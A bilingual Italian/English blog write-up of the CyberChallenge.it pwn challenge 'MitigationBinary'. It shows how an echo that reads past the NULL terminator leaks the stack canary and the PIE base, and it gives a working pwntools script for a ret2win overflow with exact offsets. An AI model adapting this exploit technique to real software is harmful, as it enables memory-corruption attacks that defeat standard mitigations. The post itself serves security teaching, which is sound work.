---
layout: cyber-post
title: "MitigationBinary - Defeating canary + PIE with an echo leak"
date: 2025-03-10
categories: 
  - writeups
  - stack
tags:
  - buffer overflow
  - stack canary
  - pie
  - info leak
  - ret2win
  - pwn
  - ctf
  - cyberchallenge
excerpt: "Writeup della challenge MitigationBinary di CyberChallenge: leak di canary e base PIE sfruttando un echo dell'input, poi ret2win con il canary rimesso al suo posto"
---

<div id="star-alert" class="star-alert">
  <div class="star-alert-content">
    <span class="star-icon">⭐</span>
    <span class="star-text lang-it">Ti piace il sito?</span>
    <span class="star-text lang-en">Do you like the site?</span>
    <br>
    <span class="star-text lang-it">Lascia una stella su GitHub!</span>
    <span class="star-text lang-en">Leave a star on GitHub!</span>
    <br>
    <a href="https://github.com/Chris1sFlaggin/Chris1sFlaggin.github.io" target="_blank" class="star-button">
      <span class="lang-it">⭐ Stella</span>
      <span class="lang-en">⭐ Star</span>
    </a>
    <button id="close-star-alert" class="close-button">&times;</button>
  </div>
</div>

<div class="lang-it" markdown="1">
PWN CTF challenge write up. Challenge di **CyberChallenge.it** (autore: *mirco*), risolta come pwn tutor a UniTo.

---

# MitigationBinary

## Il programma

Come dice il nome, il binario ha **tutte** le mitigazioni attive: canary, NX, PIE, Full RELRO. Il programma legge ripetutamente un messaggio in un buffer e ne fa l'**echo** (lo ristampa) finché non riceve `STOP`. C'è una `winFunction` non raggiungibile dal flusso normale.

</div>

<div class="lang-en" markdown="1">
PWN CTF challenge write up. **CyberChallenge.it** challenge (author: *mirco*), solved as a pwn tutor at UniTo.

---

# MitigationBinary

## The program

As the name suggests, the binary has **all** mitigations on: canary, NX, PIE, Full RELRO. The program repeatedly reads a message into a buffer and **echoes** it back until it receives `STOP`. There's a `winFunction` unreachable from the normal flow.

</div>

```zsh
~/Downloads ❯ checksec mitigationBinary
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

<div class="lang-it" markdown="1">
## La vulnerabilità

La chiave è l'**echo**: il programma ristampa esattamente i byte che gli mandiamo. Se scriviamo *appena oltre* la lunghezza terminata da NULL, l'echo continua a leggere sullo stack e ci restituisce ciò che c'è oltre il nostro input. Con due invii mirati leakiamo prima il canary e poi un indirizzo del codice (per la base PIE):

- **Canary**: inviando `105` byte, l'echo prosegue oltre il buffer e ci mostra i 7 byte alti del canary; il byte basso è sempre `\x00`, quindi lo rimettiamo noi.
- **PIE**: inviando `152` byte arriviamo a un puntatore a codice salvato sullo stack (un return address). Sappiamo di quale funzione si tratta (`main`), quindi `base = leak - main_offset`.

</div>

<div class="lang-en" markdown="1">
## The vulnerability

The key is the **echo**: the program prints back exactly the bytes we send. If we write *just past* the NULL-terminated length, the echo keeps reading on the stack and returns whatever sits beyond our input. With two targeted sends we leak first the canary and then a code address (for the PIE base):

- **Canary**: sending `105` bytes, the echo runs past the buffer and shows the 7 high canary bytes; the low byte is always `\x00`, so we prepend it ourselves.
- **PIE**: sending `152` bytes reaches a saved code pointer on the stack (a return address). We know which function it belongs to (`main`), so `base = leak - main_offset`.

</div>

```python
from pwn import *
elf = ELF("./mitigationBinary")
r = process("./mitigationBinary")

# leak canary
r.sendafter(b"Insert your messagge:", b"A"*105)
r.recvuntil(b"A"*105)
canary = b"\x00" + r.recv(7)
log.info(f"canary = {hex(u64(canary))}")

# leak base PIE
r.sendafter(b"Insert your messagge:", b"A"*152)
r.recvuntil(b"A"*152)
pie_leak = u64(r.recv(6) + b"\x00\x00")
elf.address = pie_leak - elf.symbols["main"]
log.info(f"PIE base = {hex(elf.address)}")
```

<div class="lang-it" markdown="1">
## L'exploit — ret2win

Con canary e base PIE in mano, l'overflow finale è banale: `104` byte di padding, il **canary intatto**, `8` byte per il saved rbp, e infine l'indirizzo (rilocato) di `winFunction`. Un ultimo `STOP` fa uscire dal loop e ritornare, saltando nella win.

</div>

<div class="lang-en" markdown="1">
## The exploit — ret2win

With canary and PIE base in hand, the final overflow is trivial: `104` bytes of padding, the **intact canary**, `8` bytes for saved rbp, and finally the (relocated) address of `winFunction`. A last `STOP` breaks out of the loop and returns, jumping into the win.

</div>

```python
payload  = b"A"*104 + canary + b"A"*8 + p64(elf.symbols["winFunction"])
r.sendafter(b"Insert your messagge:", payload)
r.sendafter(b"Insert your messagge:", b"STOP")
r.interactive()
```

<div class="lang-it" markdown="1">
Canary + PIE + NX + Full RELRO sembrano tanti, ma un semplice echo che stampa oltre il NULL terminator li rende tutti irrilevanti: due leak e siamo dentro.

> 💭 Se hai bisogno di chiarimenti scrivimi pure su discord: *chris1sflaggin*.
</div>

<div class="lang-en" markdown="1">
Canary + PIE + NX + Full RELRO sound like a lot, but a simple echo that prints past the NULL terminator makes them all irrelevant: two leaks and we're in.

> 💭 If you need any clarification, feel free to text me on discord: *chris1sflaggin*.
</div>
